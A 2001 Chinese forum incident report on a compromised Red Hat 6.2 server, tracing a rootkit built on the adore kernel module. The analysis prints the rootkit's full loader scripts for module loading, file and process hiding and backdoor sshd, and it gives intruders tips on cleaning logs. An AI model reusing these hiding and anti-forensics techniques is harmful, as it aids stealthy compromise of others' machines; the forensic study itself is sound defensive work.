---
title: "一次入侵检查"
date: 2001-08-23T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-252"
---

[inburst](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=2721) (inburst_at_263.net)

一次入侵检查


by liz（男生！！！）                           08/18/2001


一. 发现


前两天装了一个Redhat 6.2，因为懒，系统开了ftp和telnet服务之后就没再管过，平时扔在那里做个ftp中转站。

前日，朋友告诉我机器的ftp不能匿名登录了，很是纳闷，登上去nmap一下，发现不对了：


[liz]$ nmap 127.0.0.1

Port       State       Service

21/tcp     open        ftp                                          

23/tcp     open        telnet

111/tcp    open        sunrpc

113/tcp    open        auth


看看网络情况：


[liz]$ netstat -an

Active Internet connections (servers and established)

Proto Recv-Q Send-Q Local Address           Foreign Address         State      

tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN            

tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      

tcp        0    138 a:23                    b:1122                  ESTABLISHED


hoho，竟然没有，难道netstat被替换掉了？

看看RPM校验：


[liz]$ rpm -qf /bin/netstat 

net-tools-1.54-4

[liz]$ rpm -V net-tools


什么都没有，似乎...netstat没有问题，难道加载了llkm？


[liz]$ lsmod

Module                  Size  Used by


空的（系统本身没有加载lkm），module隐藏了？


是不是杞人忧天啊？看看系统有什么改变没有？


[liz]$ cat /var/log/message

Aug  9 00:05:54 FTP_test PAM_pwdb[889]: (login) session opened for user liz by (uid=0)

Aug  9 00:07:34 FTP_test PAM_pwdb[889]: (login) session closed for user liz

Aug  9 00:07:34 FTP_test inetd[483]: pid 888: exit status 1

Aug  9 00:39:51 FTP_test inetd[483]: pid 919: exit status 1

Aug  9 04:02:00 FTP_test anacron[979]: Updated timestamp for job `cron.daily'to 2001-08-09

Aug  9 06:28:48 FTP_test inetd[483]: extra conf for service 19/tcp (skipped) 

Aug 11 11:50:32 FTP_test PAM_pwdb[608]: (login) session opened for user liz by (uid=0)


嘻嘻，发现问题了：怎么大半夜里我的帐号还在用？还有，9号到11号之间竟然没有任何记录？虽然我的机器利用率不高，可crond总还是在跑的吧，连这个都没有，显然显然...

再看看wtmp记录：


[liz]$ strings /var/log/wtmp

...

ftpd748

pts/0

ftpd786

@ftp

pd950c097.dip.t-dialin.net

ftpd786

pts/0

...

ftpd14698

@ftp

pd950ef94.dip.t-dialin.net

ftpd14698

pts/0

....

ftpd15200

@ftp

211.178.18.15

ftpd15200


挺热闹的嘛，当然了，不足为证。

忘了忘了，最重要的：


[liz]$ w

USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT

liz      pts/0    b                 10:58am  0.00s  0.11s   ?     -


只有我一个，也就这个log正常了。


现在可以肯定，系统有人进来了。


比较麻烦，静下心来想一想......


一个cracker，找到一个redhat 6.2的漏洞，比如说wu-ftp2.6 漏洞，很顺利的（5555...没面子）拿到root权限，上载一些东东，加载llkm，隐藏相应的进程、目录和llkm，然后留一个后门（姑且是111或/和113端口的了），擦脚印，撤。


恩，典型的攻击方式，很符合系统的记录，可是留下

痕迹1：wtmp里pd950ef94.dip.t-dialin.net两次来我的机子，而且时间相差甚远（看ftpd号），又是拨号用户，也许不是他，可是我现在抓不到人，错抓一个也比一个没有强，算他倒霉了，*_^。

痕迹2：message里擦脚印也不高明点，一股脑删，唉。

痕迹3：好端端的给我机器开几个服务，也不找个高明点的后门，不是明摆着让我去查嘛。

痕迹4，5，6...：待查，呵呵


好了，既然他加载了llkm，rc里势必要留下点什么，要不然机器一重起，llkm没了就完了。


可是rc里那么多，我一个一个查，还不累死啊？

偷个懒，md5一下。


[liz]$ md5sum


慢着.......，现在系统不能相信了，md5sum也不例外，找个干净的cp过来md5。


[liz]$ ftp...

....

[liz]$ /usr/bin/md5sum /etc/inittab > /tmp/md5.txt

[liz]$ cd /etc/rc.d

[liz]$ /usr/bin/md5sum `find `pwd` -type f` >> /tmp/md5.txt


再找个干净的机器造个相同的文件md5.txt1

diff一下：


[liz]$ diff /tmp/md5.txt /tmp/md5.txt1 > result.txt


经过详细和漫长（么？）的比较，并去除链接和以K开头的文件，终于发现两个不一样：

/etc/rc.d/rc.loacl

/etc/rc.d/init.d/syslog


懒得自己去看，还是diff吧，取干净的rc.local和syslog过来

diff的结果：


干净的rc.local忘记注释issue那部分了，无妨无妨


syslog：

<         /bin/rkup &


^_^，检测工作结束，拔掉网线，睡觉。


二. 分析


找到cracker加载的位置，以下就好办了：

[liz]$ cat /bin/rkup

#!/bin/sh

# Kkit by r41n (c) 2000

RKPATH=/usr/lib/.rain

...


# Loads and hides knark

...


# Hides files

...


/bin/kload &>/dev/null


呵呵，原来是knark啊，顺势看看kload，找到如下文件：


/bin/rkup

/bin/kload


/usr/lib/.rain目录下：


.:

bot  home  lkm  ssh


./bot:

c0r3  emech


./bot/c0r3:

c0r3


ls: ./bot/emech: Permission denied

./home:


./lkm:

adore.o  ava  modhide.o  src


./lkm/src:

adore.c  ava.c  config  libinvisible.c  libinvisible.h  modhide.c


./ssh:

ssh_host_key  ssh_random_seed  sshd.pid  sshd_config  sshdchk  sshdx


经过仔细的（又来了...）分析，终于弄明白大部分是作什么用的：


入侵的cracker似乎叫r41n，这些东东都是他自己写的rootkit kkit里的，从这几个地方可以看到：

（当然或许是个全盘照抄的cracker也不一定）

[liz]$ cat /bin/rkup

#!/bin/sh

# Kkit by r41n (c) 2000

...


[liz]$ cat /usr/lib/.rain/home/.bashrc

...

echo "       Welcome r41n! Enjoy Kkit by r41n!"

echo -n " 0wn3d: Thu Aug  9 06:42:38 HKT 2001 "

...


而且可以看到，这个cracker还把系统攻破的时间记下来，跟前边分析的几个log出现问题的时间一致。


从分析的结果看，r41n的这个kkit用的还是knark的思想，又针对一些具体情况做了改动。cracker用的主目录/usr/lib/.rain还是knark风格的，实在没创意。


以下是各个文件作用的分析：

/bin/rkup：

---------start------------

#!/bin/sh

# Kkit by r41n (c) 2000

RKPATH=/usr/lib/.rain

PATH=...


# Loads and hides knark

if [ "$1" != "kit" ]; then

  depmod -a &>/dev/null

  insmod $RKPATH/lkm/adore.o &>/dev/null

  T=`lsmod | grep "adore"`

  if [ ! "$T" ]; then

#    echo "cant load .. recompile" >/test

   cd $RKPATH/lkm/src

   ./config

   ./compile

   if [ -e adore.o ]; then

     cp -f adore.o .. &>/dev/null

     cp -f modhide.o .. &>/dev/null

     cp -f ava .. &>/dev/null

     rm -f *o &>/dev/null

     rm -f ava &>/dev/null

     rm -f compile &>/dev/null

#    echo "ok recompiled... loading!" >>/test        

    else

     rm -rf /usr/lib/.rain &>/dev/null

     rm -rf /bin/rkup &>/dev/null

     rm -rf /bin/kload &>/dev/null

     echo "#!/bin/sh" >/bin/rkup

     echo "# r41n was here..." >>/bin/rkup

     chmod +x /bin/rkup

#     echo "cant recompile! OUT!" >>/test        

     exit

    fi

    insmod $RKPATH/lkm/adore.o &>/dev/null

    T=`lsmod | grep "adore"`    

    if [ ! "$T" ]; then    

     rm -rf /usr/lib/.rain &>/dev/null

     rm -rf /bin/rkup &>/dev/null

     rm -rf /bin/kload &>/dev/null

     echo "#!/bin/sh" >/bin/rkup

     echo "# r41n was here..." >>/bin/rkup

     chmod +x /bin/rkup

#     echo "cant load after recompile! OUT!" >>/test             

     exit

    fi

  fi

#  echo "LOADED OK!!!" >>/test

  insmod $RKPATH/lkm/modhide.o &>/dev/null

fi


# Hides files

ava h $RKPATH &>/dev/null

ava h $RKPATH/lkm &>/dev/null

ava h $RKPATH/ssh &>/dev/null

ava h $RKPATH/home &>/dev/null

ava h $RKPATH/bot &>/dev/null

ava h /bin/rkup &>/dev/null

ava h /bin/kload &>/dev/null


/bin/kload &>/dev/null

------------end---------------


系统启动时自动载入的文件，1.编译并载入adore.o，即knark，并作简单的判断，如果不能正常载入，则删除所有相关文件，撤退（这点还是蛮好的）2.隐藏module adore，3.隐藏相关目录和文件（其实$RKPATH在adore载入以后已经自动隐藏了），3.启动/bin/kload


其中，adore是主要module，它替换系统调用，用以隐藏相关的进程、文件、非授权提升用户权限，这是它的几个函数


：

int is_invisible(pid_t pid) //查看process是否已经真的隐藏

int is_secret(struct super_block *sb, struct dirent *d) //查看文件是否已经真的隐藏

int hide_process(pid_t pid)

int remove_process(pid_t pid)  //从task-struct中移除相关process

int unhide_process(pid_t pid)

int strip_invisible()   //使process不被get_pid_list()发现（从proc里移除process么？我也没弄明白，对这个不熟）

int unstrip_invisible()

int n_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)  //隐藏文件

int n_fork(struct pt_regs regs) //完成递归隐藏文件

int n_clone(struct pt_regs regs)

int n_kill(pid_t pid, int sig)  //接收signal，和外部的接口

int n_write(unsigned int fd, char *buf, size_t count) //对netstat隐藏相关服务

int n_setuid(uid_t uid)  //提升用户权限


ava是adore的外部接口：

...

printf("Usage: %s {h,u,r,R,i,v,U} [file, PID or dummy (for U)]\n\n"

       "       h hide file\n"

       "       u unhide file\n"

       "       r execute as root\n"

       "       R remove PID forever\n"

       "       U uninstall adore\n"

       "       i make PID invisible\n"

       "       v make PID visible\n\n", argv[0]);

...


很明显，不用解释了。


modhide完成隐藏adore的工作。


下边是/bin/kload:

--------------start-------------------

#!/bin/sh

# Kkit by r41n (c) 2000

PATH=...

RKPATH=/usr/lib/.rain


# c0r3 load

$RKPATH/bot/c0r3/c0r3


# sshd start

cd $RKPATH/ssh

./sshdx -q &>/dev/null


# psybnc start

#cd $RKPATH/proxy/psybnc

#./psybncx &>/dev/null


# emech start

cd $RKPATH/bot/emech

./mechx &>/dev/null

#killall -31 mechx  &>/dev/null


cd /


# hide`em

#killall -31 sshdx &>/dev/null

#killall -31 c0r3 &>/dev/null

----------end---------------------


从中可见，cracker起了一个sshd后门（就是这个dameon把前边所说的113端口占用了），并起了一个irc的客户端mechx（干什么？不懂），然后隐藏相应的进程。这些苦于没有源码，只能靠猜测了。


三. 清理（略）

四. 总结

一次典型的llkm攻击。

1. 给我等被害人的：

(1) 系统一定要及时打补丁，这次遇上的是一个用llkm的cracker，如果运气不好，遇上一个替换系统函数库的（这个俺也不懂，谁有问题问lg_wu去，*_^），那就惨死了。

(2) 装完系统最好先对关键文件做个备份并做md5sum，以后怀疑出问题时拿这些对照，可以很容易找到入侵点。例如写这么一个简单的shell脚本，完了把那些文件放到安全的地方：


----------start-----------------

#!/bin/bash

echo "###########################################################"

echo "## This is only an idea，you can do whatever you want!   ##"  

echo "##                                      by liz           ##"

echo "##                                      08/18/2001       ##"

echo "###########################################################"

                               

FILE=/tmp/back/md5.txt


cd /tmp

rm -rf back

mkdir back


cd back 


find / -type f \( -perm -04000 -o -perm -02000 \) -print >& syssuid1

cat syssuid1 | grep -v "find:" > syssuid


cp /etc/inetd.conf .

cp /etc/services .

cp /bin/login .

cp /etc/passwd .

cp /etc/shadow .


strings /bin/login > strlogin


#md5 myself

/usr/bin/md5sum /usr/bin/md5sum > $FILE

/usr/bin/md5sum /usr/bin/find >> $FILE

/usr/bin/md5sum /usr/bin/pwd >> $FILE


#md5 files when sys init need

/usr/bin/md5sum /etc/lilo.conf >> $FILE

/usr/bin/md5sum /etc/inittab >> $FILE

cd /etc/rc.d

/usr/bin/md5sum `find `pwd` -type f` >> $FILE

cd -


#md5 files which seem important

/usr/bin/md5sum /bin/login >> $FILE

/usr/bin/md5sum /bin/ps >> $FILE

/usr/bin/md5sum /bin/netstat >> $FILE

/usr/bin/md5sum /bin/ls >> $FILE

/usr/bin/md5sum /bin/su >> $FILE


#md5 some conf files

/usr/bin/md5sum /etc/resolv.conf >> $FILE

/usr/bin/md5sum /etc/passwd >> $FILE

/usr/bin/md5sum /etc/services >> $FILE


#/usr/bin/md5sum /etc/inetd.conf >> $FILE


cd ..

tar zcvf back.tar.gz back/

rm -rf back

----------end-------------------


将来直接做对照就可以啦（愿意的话你再写个对照的脚本）。


2.给cracker的：

(1) 不要随便改对方机器的配置，会很容易被抓到！

(2) log一定要清理干净，不要相信那些所谓的工具，还是把工具源码找来自己改合适最好


3.疑问

(1) 在分析cracker程序的过程中发现一个问题：

adore.c中：

只看到了系统调用的定义（仅仅是定义而已，没有内容）：


int (*o_getdents)(unsigned int, struct dirent *, unsigned int);

int (*o_kill)(int, int);

int (*o_write)(unsigned int, char *, size_t);

int (*o_fork)(struct pt_regs);

int (*o_clone)(struct pt_regs);

int (*o_setuid)(uid_t);

int (*o_symlink)(const char *, const char*);


和使用：


        REPLACE(write);

    REPLACE(getdents);

    REPLACE(kill);

       REPLACE(fork);

    REPLACE(clone); 

       REPLACE(setuid);


它们具体是怎么实现的，程序里却没有，adore.c也没有自定义的include，难道说...系统函数库已经被替换掉了？

(2)cracker为什么要起一个irc？这个好像在很多情况下都存在，是cracker的惯例，还是一种隐秘的通信方式？

(3)kload里起的那几个程序

$RKPATH/bot/c0r3/c0r3

./sshdx -q

./mechx

之间的关系还没有弄明白，似乎不是sshdx是sshd后台进程、mechx是irc客户端那么简单。 


关于《一次入侵检查》 

原创：liz0（liz） 

 

由于时间仓促，再加上水平有限，文中出现了几个大的纰漏，因为只是贴在论坛上，也没再管，忽然发现这篇报告被转载了，顿觉有些问题如不纠正，实在是贻害朋友们，所以写了封信给转载的inburst<inburst@263.net>，主要是以下内容，不知什么原因没有回复，所以赶快post来，希望xfocus的朋友们能把这篇补在原文后边，不至于误导读者和被大虾们骂，:) 


一个是对所发现的rootkit的猜测。我看到源码中有几个knark字样，便想当然的想它是knark，后来经朋友提醒知道这个并不是knark，而是adore，后经我对照源码，果然是adore，我的猜想是错误的。 

adore主页见：[http://www.team-teso.net/](http://www.team-teso.net/) 


另一个问题是我在文章最后的疑问，关于几个系统调用实现的问题，则纯属我一时昏了头，没有分析好源码所致： 

程序中定义了一个宏REPLACE: 

#define REPLACE(x) o_##x = sys_call_table[SYS_##x];\ 

   sys_call_table[SYS_##x] = n_##x 

它显然是把o_##x（原系统调用）替换为n_##x，即我在原文中上边分析的几个函数，可惜我只看了函数实现，没有注意这个宏，实在是个低级的错误。 


关于程序源码，由于惯例我没有贴出来，不过源码实际上可以去adore网站down，免得看文章时一头雾水。 


还有几个我的命令写法，有几个地方太过麻烦，有些已经有网友纠正，有些是我后来发现： 

/usr/bin/md5sum `find `pwd` -type f` >> $FILE 

可以写成： 

find ./ -type f -exec /usr/bin/md5sum {} >> $FILE \; 

似乎更容易理解一些。 


find / -type f \( -perm -04000 -o -perm -02000 \) -print >& syssuid1 

cat syssuid1 | grep -v "find:" > syssuid 

可以写成 

find / -type f \( -perm -04000 -o -perm -02000 \) -print 1>syssuid 3>/dev/null 


另有strings wtmp我是习惯了用strings，不必老用这个东西的，last就可以了（实在是常识的东西，又是该死） 


还有一个我在文章中怀疑入侵者是那个拨号用户，后来经我跟踪发现，似乎也不太象，我后来跟踪的结果入侵者一直来自于台湾，而那个拨号用户似乎不是台湾的（没有太详细IP地址分配数据库，没法作结论），当然那人是不是台湾的，也不能肯定（后来没什么时间，就没再跟踪下去了） 


最后文章一个非常非常重要的地方，忘记致谢了： 

quack,lg_wu，scz，以及其他论坛和BBS上的大虾们。 


我的邮件 liz@ccnet.cn.net
